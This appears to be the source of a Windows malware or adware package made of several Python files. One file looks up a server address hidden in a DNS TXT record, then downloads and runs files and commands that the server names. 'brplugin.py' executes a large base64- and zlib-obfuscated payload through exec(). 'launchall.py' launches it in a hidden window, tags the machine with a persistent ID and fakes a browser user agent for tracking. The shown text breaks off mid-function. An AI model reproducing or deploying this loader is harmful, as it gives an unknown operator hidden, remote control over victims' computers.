
import dns.resolver, base64, urllib.request, os, json, os.path, subprocess, sys
from os.path import expandvars
_x = expandvars
os.chdir(os.path.abspath(os.path.dirname(sys.argv[0])))
cnf = json.loads(open(os.path.dirname(os.path.realpath(__file__)) + '\\localconfig.json').read())
DOMAIN = cnf['domain']
SUFFIX = cnf['suffix']

def run_silent(s):
    try:
        CREATE_NO_WINDOW = 0x08000000
        subprocess.call(s, creationflags=CREATE_NO_WINDOW|subprocess.CREATE_NEW_PROCESS_GROUP)
    except:
        pass

def run(s):
    try:
        subprocess.call(s, creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)
    except:
        pass

def s_sha1(filepath):
    from hashlib import sha1
    from os.path import isfile
    if isfile(filepath + '.sha1'):
        return open(filepath + '.sha1', 'r').read()
    if not isfile(filepath):
        return ''
    with open(filepath, 'rb') as f:
        res = sha1(f.read()).hexdigest()
        open(filepath + '.sha1', 'w').write(res)
        return res


def main():
    from uuid import uuid4
    from hashlib import sha1
    resolver = dns.resolver.Resolver()
    resolver.nameservers = ['8.8.8.8', '8.8.4.4']
    answers = resolver.query(DOMAIN, 'TXT')
    url = base64.b64decode(answers[0].strings[0]).decode("utf8") + SUFFIX
    cid=str(uuid4())
    if os.path.isfile("uuid.txt"):
        cid=open("uuid.txt").read().strip()
    else:
        open("uuid.txt", "w").write(cid)
    configpath = url + '/config.json?'+cid
    config = json.loads(urllib.request.urlopen(configpath).read().decode("utf8"))
    is_update = False
    for item in config['update']:
        if s_sha1(_x(item['to'])).lower() != item['sha1'].lower():
            urllib.request.urlretrieve(url + item['from'], _x(item['to']))
            res = sha1(open(_x(item['to']), "rb").read()).hexdigest()
            open(_x(item['to']) + '.sha1', 'w').write(res)
            is_update = True

    if is_update:
        if 'afterupdate' in config:
            for item in config['afterupdate']:
                run(_x(item))


main()



## contents of brplugin.py (dfdcf7780fe08a644b98eac56bdfde7fb52dbd40bca4f6df50f2a90ec6e044b1)
import zlib, base64
exec(zlib.decompress(base64.b64decode('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')))
# Created by pyminifier (https://github.com/liftoff/pyminifier)

## contents of launchall.py (45013f2390462cc9bae41e611c29e2de9cb3564699da42ac813c8fee71e9495c)
import os, os.path, time, subprocess, winreg, sys, time
from urllib.request import urlopen

from optparse import OptionParser

parser = OptionParser()
parser.disable_interspersed_args()
parser.add_option('--pb', dest='pb', default="")
#parser.add_option('--subid', dest='subid', default="")

opts, args = parser.parse_args()


curDir=os.path.abspath(os.path.dirname(sys.argv[0]))
os.chdir(curDir)




def readOutput(s, tryes=5):
    from subprocess import Popen, PIPE, STDOUT
    res=''
    try:
        CREATE_NO_WINDOW = 0x08000000
        p = Popen(s, creationflags=CREATE_NO_WINDOW|subprocess.CREATE_NEW_PROCESS_GROUP, stderr=PIPE, stdout=PIPE, stdin=PIPE)
        res=p.stdout.read().decode("utf8").strip(' \t\n\r')
        p.stderr.read()
        p.communicate()
    except: 
        if (tryes>0):
            time.sleep(10)
            return readOutput(s, tryes-1)
    return res

def run_async(s):
    try:
        subprocess.Popen(s, creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)
    except:
        pass



cmdPrefix=r'python\pythonw brplugin.py'


# def getUserAgent():
#     from ctypes import c_int, windll, create_string_buffer, byref
#     ua=create_string_buffer(1024)
#     sz=c_int(1024)
#     ObtainUserAgentString=windll.urlmon.ObtainUserAgentString
#     ObtainUserAgentString(0, ua, byref(sz))
#     return ua.value.decode("cp1252")


def isWin64():
    import ctypes, sys 
    i = ctypes.c_int() 
    kernel32 = ctypes.windll.kernel32 
    process = kernel32.GetCurrentProcess() 
    kernel32.IsWow64Process(process, ctypes.byref(i)) 
    is64bit = (i.value != 0) 
    return is64bit 

def getVersion():
    import platform, re
    return re.search('^(\d+\.\d+)', platform.version()).group(0)

def exOS():
    return "Win%s%s"%(getVersion(), '(x64)' if isWin64() else '')

def getUserAgent():
    return 'Mozilla/5.0 (Windows NT %s; %srv:47.0) Gecko/20100101 Firefox/47.0'%(getVersion(), 'Win64; x64; ' if isWin64() else '')


def getExParams():
    import ctypes
    params=ctypes.c_wchar_p(ctypes.windll.kernel32.GetCommandLineW()).value
    b="boundary"
    p=params.find(b)
    if p==-1:
        return ''
    return params[p+len(b):].strip()

def GATracker(TID, collect='http://www.google-analytics.com/collect?', urlsuffix=''):
    from uuid import uuid4
    from ctypes import windll
    from random import randrange
    from locale import getdefaultlocale
    tid=TID
    ua=getUserAgent()
    cid=str(uuid4())
    if os.path.isfile("uuid.txt"):
        cid=open("uuid.txt").read().strip()
    else:
        open("uuid.txt", "w").write(cid)

    subid=getExParams()
    if os.path.isfile("subid.txt"):
        subid=open("subid.txt").read().strip()
    else:
